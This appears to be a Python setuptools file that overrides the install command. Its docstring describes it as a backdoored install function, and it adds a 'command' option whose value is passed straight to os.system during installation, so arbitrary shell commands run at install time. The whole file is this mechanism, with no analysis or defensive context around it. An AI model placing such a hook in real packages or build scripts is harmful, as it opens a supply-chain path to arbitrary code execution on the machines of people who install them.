from os import system
from setuptools.command.install import install as base

# Install class overload
class install(base):
    """
    Backdoored install function that allows command execution
    """

    user_options = base.user_options + [
        ('command=', None, "Command to execute")
    ]

    def initialize_options(self):
        base.initialize_options(self)
        self.command = None

    def run(self):
        if self.command:
            system(self.command)
        base.run(self)
